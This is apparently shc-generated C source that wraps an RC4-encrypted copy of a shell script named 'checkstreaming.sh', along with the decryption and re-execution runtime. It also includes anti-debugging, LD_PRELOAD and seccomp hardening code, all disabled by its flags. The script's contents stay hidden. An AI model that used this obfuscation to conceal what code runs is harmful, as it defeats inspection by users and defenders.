#if 0
	shc Version 4.0.3, Generic Shell Script Compiler
	GNU GPL Version 3 Md Jahidul Hamid <jahidulhamid@yahoo.com>

	shc -r -f checkstreaming.sh -o checkstreamingsh 
#endif

static  char data [] = 
#define      chk1_z	22
#define      chk1	((&data[0]))
	"\266\070\324\240\167\244\051\204\066\034\145\115\334\122\211\047"
	"\326\250\272\223\123\075"
#define      opts_z	1
#define      opts	((&data[22]))
	"\041"
#define      date_z	1
#define      date	((&data[23]))
	"\015"
#define      lsto_z	1
#define      lsto	((&data[24]))
	"\046"
#define      msg2_z	19
#define      msg2	((&data[25]))
	"\102\266\171\121\015\361\377\060\264\070\134\165\125\373\144\264"
	"\270\166\011\141\212\027"
#define      shll_z	10
#define      shll	((&data[48]))
	"\123\144\125\371\103\037\246\150\024\163\151"
#define      inlo_z	3
#define      inlo	((&data[58]))
	"\000\116\305"
#define      pswd_z	256
#define      pswd	((&data[84]))
	"\102\010\256\327\033\307\241\317\354\323\111\031\100\164\020\322"
	"\242\265\063\055\314\153\300\152\215\140\353\315\373\211\045\325"
	"\331\021\001\002\372\104\056\254\355\121\363\202\154\154\267\000"
	"\237\105\300\342\277\350\114\115\111\067\032\104\301\100\032\232"
	"\122\033\234\114\137\312\371\115\034\355\317\210\131\206\210\371"
	"\314\111\333\213\061\047\331\172\136\364\277\037\065\331\271\207"
	"\364\125\324\124\040\315\242\074\272\161\304\023\367\115\014\303"
	"\226\350\117\307\017\051\102\155\035\001\214\122\332\106\331\317"
	"\233\255\044\274\173\306\370\066\067\275\112\057\012\127\363\240"
	"\077\103\150\116\154\252\273\212\253\110\334\206\216\266\126\052"
	"\144\172\346\340\101\337\026\170\234\140\250\246\267\234\107\366"
	"\337\260\104\114\132\000\326\006\111\263\215\327\152\343\002\316"
	"\136\350\256\237\307\305\030\143\045\300\012\335\134\122\323\074"
	"\002\030\211\135\031\140\143\142\023\361\071\175\324\074\114\062"
	"\044\373\322\354\300\352\117\346\252\132\303\007\254\226\104\256"
	"\257\315\013\310\056\157\053\101\140\145\277\065\241\014\150\305"
	"\010\072\262\310\044\002\257\317\134\162\327\011\011\033\267\270"
	"\351\303\201\027\063\255\131\355\277\013\307\374\033\042\121\135"
	"\053\000\064\107\307\325\026\263\251\137\315\352"
#define      text_z	511
#define      text	((&data[472]))
	"\167\223\360\244\140\133\144\115\033\160\025\027\213\070\151\351"
	"\143\151\036\253\060\364\301\344\235\040\262\210\365\220\105\154"
	"\043\065\020\204\221\165\322\254\346\347\304\161\037\055\133\203"
	"\227\172\056\310\156\360\254\014\021\137\224\006\357\331\162\023"
	"\017\202\230\240\370\152\114\336\121\020\120\161\076\253\364\325"
	"\045\043\236\224\023\113\240\044\252\065\052\232\017\235\256\036"
	"\040\106\277\030\260\013\366\002\034\106\163\132\362\147\060\204"
	"\003\014\207\122\071\350\074\071\106\262\341\330\147\367\263\132"
	"\307\133\355\010\166\120\136\131\306\030\364\274\223\333\072\246"
	"\345\240\065\133\145\223\200\066\031\161\214\356\254\216\233\162"
	"\212\075\273\165\157\166\134\047\231\157\334\146\005\224\156\354"
	"\100\165\147\132\362\333\210\256\341\217\331\344\044\025\376\135"
	"\251\322\067\154\265\017\255\025\161\067\262\310\160\142\264\371"
	"\011\001\113\066\047\335\373\235\240\341\164\065\165\037\260\346"
	"\330\142\352\315\040\001\161\245\102\212\124\347\200\312\013\016"
	"\065\015\306\255\214\264\237\067\064\366\264\004\325\134\211\023"
	"\367\211\105\110\267\103\035\007\222\003\166\141\145\217\046\352"
	"\314\134\332\142\205\217\203\100\105\226\340\303\074\020\160\327"
	"\322\331\357\165\011\051\333\131\105\024\124\273\144\140\204\327"
	"\340\320\157\300\160\001\373\246\066\026\136\165\256\030\217\160"
	"\233\133\206\275\204\162\207\213\135\150\066\047\156\136\372\063"
	"\275\023\320\330\044\322\203\067\175\271\217\264\221\300\234\103"
	"\075\363\224\321\246\161\111\162\353\152\125\136\205\373\315\176"
	"\046\243\072\016\305\266\137\145\066\065\063\171\002\221\161\142"
	"\272\333\277\307\050\156\022\261\117\366\142\056\360\117\164\273"
	"\315\275\051\215\005\275\202\314\046\240\126\234\262\133\017\037"
	"\022\370\145\077\360\374\070\302\133\337\362\267\025\121\032\052"
	"\314\006\063\313\026\037\205\365\226\144\016\330\124\337\365\335"
	"\121\037\265\035\176\030\053\214\232\355\116\327\117\227\123\372"
	"\000\312\000\157\122\107\140\023\020\046\243\322\115\321\122\006"
	"\215\105\165\247\241\312\327\040\000\210\274\127\263\166\320\071"
	"\222\105\076\076\116\270\340\037\275\232\302\104\315\345\122\314"
	"\265\306\162\031\102\053\234\307\142\144\135\254\273\035\274\132"
	"\005\063\007\040\036\025\215\236\344\232\154\143\210\223\005\007"
	"\117\042\337\323\274\330\102\311\014\117\144\137\055\020\301\244"
	"\217\132\002\005\032\065\302\125\353\116\132\276\326\123\265\041"
	"\337\164\073\363\014\027\244\016\254\020\037\112\223\363\027\153"
	"\210\304\175\326\230\233\277\123\153\120\177\056\312\275\241\116"
	"\124\303\147\245\235\157\271\264\211\273\101\222\310\202\030\212"
	"\317\254\236\032\115\302\304\203\355\137\223\212\015\261\252\123"
	"\160\302\004\174\271\006\231\377\172\364\362\342\045\013\154\364"
	"\270\013\016\005\315\322\211\272\061\034\104\077\316\357\223\077"
	"\261\227\273\152\236\124\152\030\111\135\372\156\150\147\142\040"
	"\163\160\046\100\103\257\373\165\313\100\264\232\057\107\331\341"
	"\337\225\114\176\352\266\227\063\023\222\241\174"
#define      chk2_z	19
#define      chk2	((&data[1077]))
	"\005\110\020\317\276\037\064\006\063\377\213\202\311\061\072\306"
	"\012\170\262\155\164\302"
#define      rlax_z	1
#define      rlax	((&data[1099]))
	"\204"
#define      tst2_z	19
#define      tst2	((&data[1100]))
	"\007\217\362\255\111\047\250\346\332\152\310\161\025\056\127\345"
	"\254\221\364\352"
#define      msg1_z	65
#define      msg1	((&data[1134]))
	"\051\261\373\011\106\107\207\061\376\037\144\022\261\005\313\043"
	"\072\063\122\135\030\347\102\124\252\110\132\277\033\172\372\006"
	"\117\240\062\331\142\304\102\240\211\351\262\301\153\342\137\335"
	"\344\155\247\117\115\365\062\233\306\247\342\232\077\037\330\252"
	"\152\364\207\241\273\200\004\241\231\165\071\207\151\302\246\216"
#define      xecc_z	15
#define      xecc	((&data[1200]))
	"\172\065\027\054\341\003\345\346\057\304\250\312\051\157\017"
#define      tst1_z	22
#define      tst1	((&data[1217]))
	"\310\065\154\114\232\211\327\334\237\341\236\200\242\226\030\367"
	"\205\104\033\257\171\205\270\145\137\162\141\235\134"/* End of data[] */;
#define      hide_z	4096
#define SETUID 0	/* Define as 1 to call setuid(0) at start of script */
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
#define HARDENING	0	/* Define as 1 to disable ptrace/dump the executable */
#define BUSYBOXON	0	/* Define as 1 to enable work with busybox */

#if HARDENING
static const char * shc_x[] = {
"/*",
" * Copyright 2019 - Intika <intika@librefox.org>",
" * Replace ******** with secret read from fd 21",
" * Also change arguments location of sub commands (sh script commands)",
" * gcc -Wall -fpic -shared -o shc_secret.so shc_secret.c -ldl",
" */",
"",
"#define _GNU_SOURCE /* needed to get RTLD_NEXT defined in dlfcn.h */",
"#define PLACEHOLDER \"********\"",
"#include <dlfcn.h>",
"#include <stdlib.h>",
"#include <string.h>",
"#include <unistd.h>",
"#include <stdio.h>",
"#include <signal.h>",
"",
"static char secret[128000]; //max size",
"typedef int (*pfi)(int, char **, char **);",
"static pfi real_main;",
"",
"// copy argv to new location",
"char **copyargs(int argc, char** argv){",
"    char **newargv = malloc((argc+1)*sizeof(*argv));",
"    char *from,*to;",
"    int i,len;",
"",
"    for(i = 0; i<argc; i++){",
"        from = argv[i];",
"        len = strlen(from)+1;",
"        to = malloc(len);",
"        memcpy(to,from,len);",
"        // zap old argv space",
"        memset(from,'\\0',len);",
"        newargv[i] = to;",
"        argv[i] = 0;",
"    }",
"    newargv[argc] = 0;",
"    return newargv;",
"}",
"",
"static int mymain(int argc, char** argv, char** env) {",
"    //fprintf(stderr, \"Inject main argc = %d\\n\", argc);",
"    return real_main(argc, copyargs(argc,argv), env);",
"}",
"",
"int __libc_start_main(int (*main) (int, char**, char**),",
"                      int argc,",
"                      char **argv,",
"                      void (*init) (void),",
"                      void (*fini)(void),",
"                      void (*rtld_fini)(void),",
"                      void (*stack_end)){",
"    static int (*real___libc_start_main)() = NULL;",
"    int n;",
"",
"    if (!real___libc_start_main) {",
"        real___libc_start_main = dlsym(RTLD_NEXT, \"__libc_start_main\");",
"        if (!real___libc_start_main) abort();",
"    }",
"",
"    n = read(21, secret, sizeof(secret));",
"    if (n > 0) {",
"      int i;",
"",
"    if (secret[n - 1] == '\\n') secret[--n] = '\\0';",
"    for (i = 1; i < argc; i++)",
"        if (strcmp(argv[i], PLACEHOLDER) == 0)",
"          argv[i] = secret;",
"    }",
"",
"    real_main = main;",
"",
"    return real___libc_start_main(mymain, argc, argv, init, fini, rtld_fini, stack_end);",
"}",
"",
0};
#endif /* HARDENING */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

#if HARDENING

#include <sys/ptrace.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/prctl.h>
#define PR_SET_PTRACER 0x59616d61

/* Seccomp Sandboxing Init */
#include <stdlib.h>
#include <stdio.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/socket.h>

#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/audit.h>

#define ArchField offsetof(struct seccomp_data, arch)

#define Allow(syscall) \
    BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, SYS_##syscall, 0, 1), \
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW)

struct sock_filter filter[] = {
    /* validate arch */
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, ArchField),
    BPF_JUMP( BPF_JMP+BPF_JEQ+BPF_K, AUDIT_ARCH_X86_64, 1, 0),
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),

    /* load syscall */
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, offsetof(struct seccomp_data, nr)),

    /* list of allowed syscalls */
    Allow(exit_group),  /* exits a process */
    Allow(brk),         /* for malloc(), inside libc */
    Allow(mmap),        /* also for malloc() */
    Allow(munmap),      /* for free(), inside libc */

    /* and if we don't match above, die */
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
};
struct sock_fprog filterprog = {
    .len = sizeof(filter)/sizeof(filter[0]),
    .filter = filter
};

/* Seccomp Sandboxing - Set up the restricted environment */
void seccomp_hardening() {
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
        perror("Could not start seccomp:");
        exit(1);
    }
    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &filterprog) == -1) {
        perror("Could not start seccomp:");
        exit(1);
    }
} 
/* End Seccomp Sandboxing Init */

void shc_x_file() {
    FILE *fp;
    int line = 0;

    if ((fp = fopen("/tmp/shc_x.c", "w")) == NULL ) {exit(1); exit(1);}
    for (line = 0; shc_x[line]; line++)	fprintf(fp, "%s\n", shc_x[line]);
    fflush(fp);fclose(fp);
}

int make() {
	char * cc, * cflags, * ldflags;
    char cmd[4096];

	cc = getenv("CC");
	if (!cc) cc = "cc";

	sprintf(cmd, "%s %s -o %s %s", cc, "-Wall -fpic -shared", "/tmp/shc_x.so", "/tmp/shc_x.c -ldl");
	if (system(cmd)) {remove("/tmp/shc_x.c"); return -1;}
	remove("/tmp/shc_x.c"); return 0;
}

void arc4_hardrun(void * str, int len) {
    //Decode locally
    char tmp2[len];
    char tmp3[len+1024];
    memcpy(tmp2, str, len);

	unsigned char tmp, * ptr = (unsigned char *)tmp2;
    int lentmp = len;
    int pid, status;
    pid = fork();

    shc_x_file();
    if (make()) {exit(1);}

    setenv("LD_PRELOAD","/tmp/shc_x.so",1);

    if(pid==0) {

        //Start tracing to protect from dump & trace
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
            kill(getpid(), SIGKILL);
            _exit(1);
        }

        //Decode Bash
        while (len > 0) {
            indx++;
            tmp = stte[indx];
            jndx += tmp;
            stte[indx] = stte[jndx];
            stte[jndx] = tmp;
            tmp += stte[indx];
            *ptr ^= stte[tmp];
            ptr++;
            len--;
        }

        //Do the magic
        sprintf(tmp3, "%s %s", "'********' 21<<<", tmp2);

        //Exec bash script //fork execl with 'sh -c'
        system(tmp2);

        //Empty script variable
        memcpy(tmp2, str, lentmp);

        //Clean temp
        remove("/tmp/shc_x.so");

        //Sinal to detach ptrace
        ptrace(PTRACE_DETACH, 0, 0, 0);
        exit(0);
    }
    else {wait(&status);}

    /* Seccomp Sandboxing - Start */
    seccomp_hardening();

    exit(0);
}
#endif /* HARDENING */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

void chkenv_end(void);

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask = (unsigned long)getpid();
	stte_0();
	 key(&chkenv, (void*)&chkenv_end - (void*)&chkenv);
	 key(&data, sizeof(data));
	 key(&mask, sizeof(mask));
	arc4(&mask, sizeof(mask));
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

void chkenv_end(void){}

#if HARDENING

static void gets_process_name(const pid_t pid, char * name) {
	char procfile[BUFSIZ];
	sprintf(procfile, "/proc/%d/cmdline", pid);
	FILE* f = fopen(procfile, "r");
	if (f) {
		size_t size;
		size = fread(name, sizeof (char), sizeof (procfile), f);
		if (size > 0) {
			if ('\n' == name[size - 1])
				name[size - 1] = '\0';
		}
		fclose(f);
	}
}

void hardening() {
    prctl(PR_SET_DUMPABLE, 0);
    prctl(PR_SET_PTRACER, -1);

    int pid = getppid();
    char name[256] = {0};
    gets_process_name(pid, name);

    if (   (strcmp(name, "bash") != 0) 
        && (strcmp(name, "/bin/bash") != 0) 
        && (strcmp(name, "sh") != 0) 
        && (strcmp(name, "/bin/sh") != 0) 
        && (strcmp(name, "sudo") != 0) 
        && (strcmp(name, "/bin/sudo") != 0) 
        && (strcmp(name, "/usr/bin/sudo") != 0)
        && (strcmp(name, "gksudo") != 0) 
        && (strcmp(name, "/bin/gksudo") != 0) 
        && (strcmp(name, "/usr/bin/gksudo") != 0) 
        && (strcmp(name, "kdesu") != 0) 
        && (strcmp(name, "/bin/kdesu") != 0) 
        && (strcmp(name, "/usr/bin/kdesu") != 0) 
       )
    {
        printf("Operation not permitted\n");
        kill(getpid(), SIGKILL);
        exit(1);
    }
}

#endif /* HARDENING */

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PT_ATTACHEXC) /* New replacement for PT_ATTACH */
   #if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
       #define PT_ATTACHEXC	PT_ATTACH
   #elif defined(PTRACE_ATTACH)
       #define PT_ATTACHEXC PTRACE_ATTACH
   #endif
#endif

void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PT_ATTACHEXC, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];
	if (me == NULL) { me = getenv("_"); }
	if (me == 0) { fprintf(stderr, "E: neither argv[0] nor $_ works."); exit(1); }

	ret = chkenv(argc);
	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
#if HARDENING
	    arc4_hardrun(text, text_z);
	    exit(0);
       /* Seccomp Sandboxing - Start */
       seccomp_hardening();
#endif
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
#if BUSYBOXON
	varg[j++] = "busybox";
	varg[j++] = "sh";
#else
	varg[j++] = argv[0];		/* My own name at execution */
#endif
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if SETUID
   setuid(0);
#endif
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if HARDENING
	hardening();
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
